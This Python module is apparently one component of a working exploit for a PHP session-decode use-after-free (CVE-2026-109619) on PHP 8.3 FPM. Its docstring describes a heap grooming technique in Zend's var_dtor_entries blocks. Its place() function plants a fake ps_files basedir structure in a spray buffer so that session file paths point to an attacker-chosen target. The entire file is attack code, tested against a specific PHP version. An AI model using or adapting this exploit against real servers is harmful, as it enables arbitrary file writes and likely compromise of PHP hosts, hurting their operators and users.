#!/usr/bin/env python3
# INDEX: fake ps_files basedir in fresh dtor block | fpm | needs full dtor block
"""Fresh-dtor-block fake-zstr placement: land the fake ps_files->basedir backing in a FRESH
var_dtor_entries block (CVE-2026-109619 session-decode UAF write-delivery).

Mechanism (Zend/zend_variables.c var_tmp_var; php-src 8.3):
  When the dangling decoder leaves the var_dtor_entries block FULL (used_slots == 255),
  var_tmp_var() allocates a brand-new block; the decode's two pushed pairs land at the new block's
  data[0]/data[1] (basedir = &data[1]) and the fake basedir {len, path} is written past them at
  data[slot] (slot=2). DT->used_slots is NOT forged -- the fresh block arises from the full DT. The
  backing is a bare {size_t len @ fz, char path[] @ fz+8}; ps_files_path_create() reads only len and
  bytes, so no zend_string header is written.

Precondition: a dangle that leaves the var_dtor_entries block full.

API:
  place(carrier, path_nul, fz=None, fresh_block_off=0x1000, slot=2) -> fz.
    Writes {len, path_nul} at fz = fresh_block_off + 0x10 + slot*16 (default 0x1030); pass `fz` to
    override directly. path_nul is the target path with a trailing NUL. Mutates carrier in place.

Tested: 8.3.26-fpm.
Credit: kengwang, Calif Research.
"""
import struct

FRESH_BLOCK_OFF = 0x1000   # where var_tmp_var's fresh var_dtor_entries block lands in the carrier
DATA_SLOT = 2              # fake zstr at data[2] (past the two pushed pairs at data[0]/data[1])


def place(carrier, path_nul, fz=None, fresh_block_off=FRESH_BLOCK_OFF, slot=DATA_SLOT):
    """Write the fake basedir backing {len, path_nul} into the fresh var_dtor_entries block at
    data[`slot`] = fresh_block_off + 0x10 + slot*16 (default 0x1030). Pass `fz` to override that
    offset directly (calibration). Mutates `carrier`; returns the offset fz."""
    if fz is None:
        fz = fresh_block_off + 0x10 + slot * 16
    struct.pack_into("<Q", carrier, fz, len(path_nul))     # basedir->len
    carrier[fz + 8:fz + 8 + len(path_nul)] = path_nul       # basedir->val = path + NUL
    return fz
